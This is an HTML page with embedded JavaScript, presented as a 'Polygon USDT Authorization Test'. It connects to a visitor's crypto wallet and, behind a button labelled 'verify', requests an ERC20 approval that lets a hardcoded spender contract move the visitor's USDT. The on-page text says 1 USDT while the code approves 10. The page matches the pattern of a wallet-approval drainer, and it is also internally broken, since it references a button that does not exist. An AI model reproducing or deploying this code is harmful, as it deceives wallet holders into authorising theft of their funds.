<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width,initial-scale=1">

<title>Polygon USDT Authorization Test</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
</head>

<body>

<h2>Polygon USDT Authorization Test</h2>

<p id="status">Initializing...</p>

<button id="approveBtn">
    verify
</button>

<br><br>

<br><br>

<div id="details"></div>

<script>

/* =========================
   CONFIGURATION
========================= */

const POLYGON_CHAIN_ID = 137;

const USDT =
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";

const SPENDER =
    "0xf15AB8Df93e89759c7AE5E3BeB821532aAF24F4C";

// Exactly 1 USDT
const AMOUNT =
    ethers.parseUnits("10", 6);


/* =========================
   ABI
========================= */

const USDT_ABI = [

    "function approve(address spender,uint256 amount) returns(bool)",

    "function allowance(address owner,address spender) view returns(uint256)",

    "function balanceOf(address account) view returns(uint256)"
];


const SPENDER_ABI = [

    "function owner() view returns(address)",

    "function token() view returns(address)",

    "function checkAllowance(address user) view returns(uint256)",

    "function checkBalance(address user) view returns(uint256)"
];


/* =========================
   HTML ELEMENTS
========================= */

const statusEl =
    document.getElementById("status");

const detailsEl =
    document.getElementById("details");

const approveBtn =
    document.getElementById("approveBtn");

const checkBtn =
    document.getElementById("checkBtn");


/* =========================
   GLOBAL VARIABLES
========================= */

let provider = null;
let signer = null;
let user = null;


/* =========================
   ERROR HANDLER
========================= */

function showError(error) {

    console.error(error);

    statusEl.innerText =
        "ERROR: " +
        (
            error.shortMessage ||
            error.reason ||
            error.message ||
            "Unknown error"
        );
}


/* =========================
   PROVIDER
========================= */

async function createProvider() {

    if (!window.ethereum) {

        throw new Error(
            "EVM wallet not detected. Open this page inside Trust Wallet or MetaMask."
        );
    }

    provider =
        new ethers.BrowserProvider(
            window.ethereum
        );

    return provider;
}


/* =========================
   VERIFY NETWORK
========================= */

async function verifyNetwork() {

    if (!provider)
        await createProvider();

    const network =
        await provider.getNetwork();

    const chainId =
        Number(network.chainId);

    if (chainId !== POLYGON_CHAIN_ID) {

        throw new Error(
            "Wrong network. Please switch wallet to Polygon. Current chain ID: " +
            chainId
        );
    }

    return chainId;
}


/* =========================
   VERIFY SPENDER CONTRACT
========================= */

async function verifySpender() {

    const code =
        await provider.getCode(SPENDER);

    if (!code || code === "0x") {

        throw new Error(
            "USDTSpender contract not found at " +
            SPENDER +
            " on Polygon."
        );
    }

    return true;
}


/* =========================
   GET WALLET
========================= */

async function connectWallet() {

    if (!provider)
        await createProvider();

    await verifyNetwork();

    let accounts =
        await provider.send(
            "eth_accounts",
            []
        );

    if (!accounts.length) {

        statusEl.innerText =
            "Waiting for wallet connection...";

        accounts =
            await provider.send(
                "eth_requestAccounts",
                []
            );
    }

    if (!accounts.length) {

        throw new Error(
            "No wallet account available."
        );
    }

    user =
        ethers.getAddress(accounts[0]);

    signer =
        await provider.getSigner();

    return signer;
}


/* =========================
   INITIALIZE
========================= */

async function init() {

    try {

        await createProvider();

        await verifyNetwork();

        await verifySpender();

        const accounts =
            await provider.send(
                "eth_accounts",
                []
            );

        if (accounts.length) {

            user =
                ethers.getAddress(
                    accounts[0]
                );

            signer =
                await provider.getSigner();

            statusEl.innerText =
                "Connected: " +
                user +
                " | Polygon";

        } else {

            statusEl.innerText =
                "Polygon wallet detected. Tap Authorize 1 USDT.";
        }

    }

    catch(error) {

        showError(error);
    }
}


/* =========================
   APPROVE 1 USDT
========================= */

approveBtn.onclick =
async function () {

    approveBtn.disabled = true;

    try {

        await connectWallet();

        await verifySpender();

        const usdt =
            new ethers.Contract(
                USDT,
                USDT_ABI,
                signer
            );


        /* Check current allowance */

        const previousAllowance =
            await usdt.allowance(
                user,
                SPENDER
            );


        console.log(
            "Current allowance:",
            previousAllowance.toString()
        );


        if (previousAllowance >= AMOUNT) {

            statusEl.innerText =
                "Wallet already authorized at least 1 USDT.";

            await checkState();

            return;
        }


        statusEl.innerText =
            "Confirm authorization of 1 USDT in your wallet...";


        /* ERC20 approve */

        const tx =
            await usdt.approve(
                SPENDER,
                AMOUNT
            );


        console.log(
            "Approval TX:",
            tx.hash
        );


        statusEl.innerText =
            "Approval submitted. TX: " +
            tx.hash;


        const receipt =
            await tx.wait();


        if (receipt.status !== 1) {

            throw new Error(
                "Approval transaction failed."
            );
        }


        statusEl.innerText =
            "✓ 1 USDT authorized successfully. TX: " +
            receipt.hash;


        await checkState();

    }

    catch(error) {

        showError(error);

    }

    finally {

        approveBtn.disabled = false;
    }
};


/* =========================
   CHECK STATE
========================= */

async function checkState() {

    await connectWallet();

    await verifySpender();


    const usdt =
        new ethers.Contract(
            USDT,
            USDT_ABI,
            provider
        );


    const spender =
        new ethers.Contract(
            SPENDER,
            SPENDER_ABI,
            provider
        );


    const balance =
        await usdt.balanceOf(user);


    const allowance =
        await usdt.allowance(
            user,
            SPENDER
        );


    const contractOwner =
        await spender.owner();


    const configuredToken =
        await spender.token();


    detailsEl.innerHTML = `

        <hr>

        <p>
        <strong>Network:</strong>
        Polygon
        </p>

        <p>
        <strong>Wallet:</strong><br>
        ${user}
        </p>

        <p>
        <strong>USDT Balance:</strong>
        ${ethers.formatUnits(balance,6)}
        </p>

        <p>
        <strong>USDT Allowance:</strong>
        ${ethers.formatUnits(allowance,6)} USDT
        </p>

        <p>
        <strong>Spender:</strong><br>
        ${SPENDER}
        </p>

        <p>
        <strong>Contract Owner:</strong><br>
        ${contractOwner}
        </p>

        <p>
        <strong>Contract Token:</strong><br>
        ${configuredToken}
        </p>
    `;


    statusEl.innerText =
        "Wallet information loaded successfully.";
}


/* =========================
   CHECK BUTTON
========================= */

checkBtn.onclick =
async function () {

    checkBtn.disabled = true;

    try {

        statusEl.innerText =
            "Checking Polygon...";

        await checkState();

    }

    catch(error) {

        showError(error);

    }

    finally {

        checkBtn.disabled = false;
    }
};


/* =========================
   WALLET EVENTS
========================= */

if (window.ethereum) {

    window.ethereum.on(
        "accountsChanged",
        function () {
            location.reload();
        }
    );


    window.ethereum.on(
        "chainChanged",
        function () {
            location.reload();
        }
    );
}


/* =========================
   START
========================= */

init();

</script>

</body>
</html>
